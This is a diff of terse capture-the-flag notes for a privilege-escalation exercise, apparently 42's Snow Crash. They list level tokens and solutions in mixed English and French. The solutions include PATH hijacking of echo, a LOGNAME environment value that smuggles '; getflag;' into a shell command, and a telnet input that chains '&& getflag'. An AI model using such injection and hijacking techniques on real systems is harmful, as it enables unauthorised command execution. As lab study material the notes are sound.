@@ -4,7 +4,7 @@ Follow tcp => ft_wandr...NDRe.L0L
 We can see in hexdump that 7f correspond a delete donc ft_waNDReLOL
 kooda2puivaav1idi4f57q8iq
 Level03:
-system(« /usr/sbin/env echo Exploit me »)
+system(« /usr/sbin/env echo Exploit me »)
 Change echo with get flag using cd getflag tmp/echo/
 And change the PATH=/tmp/ 
 qi0maab88jeaj46qoumi7maus
@@ -30,7 +30,7 @@ Level07:
 We see a binary file we use DogBolt we see this line:
  asprintf(&var_1c, "/bin/echo %s ", getenv("LOGNAME"));
 We see we can put injection code in %s using getenv("LOGNAME")
-We just need to change the LOGNAME env with export LOGNAME=" ; getflag;  "
+We just need to change the LOGNAME env with export LOGNAME=" ; getflag;  "
 When we put ./level07 it will be  asprintf(&var_1c, "/bin/echo %s ", getenv("LOGNAME"));
 So %s =  ; getflag;
 We execute and we have Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
@@ -51,7 +51,7 @@ Output= quif5eloekouj29ke0vouxean
 Su flag08: quif5eloekouj29ke0vouxean
 Getflag: 25749xKZ8L7DkSCwJkT9dyv6f
 Level09:
-I see that ./level09 « file » do a output like
+I see that ./level09 « file » do a output like
 For each characters for the name of file do{
 puts(Caracter + i position);
 }
@@ -83,7 +83,7 @@ GetFlag=feulo4b72j7edeahuete3no7c
 Level11:
 Fichier .lua 
 f05d1d066fb246efe0c6f7d095f909a7a0cf34a0 => hardcoded passed => NotSoEasy 
-We see a echo line command so we telnet 127.0.0.1 and we use « f05d1d066fb246efe0c6f7d095f909a7a0cf34a0 && getflag > /tmp/file « 
+We see a echo line command so we telnet 127.0.0.1 and we use « f05d1d066fb246efe0c6f7d095f909a7a0cf34a0 && getflag > /tmp/file « 
 fa6v5ateaw21peobuub8ipe6s
 Getflag: fa6v5ateaw21peobuub8ipe6s
 Level14:
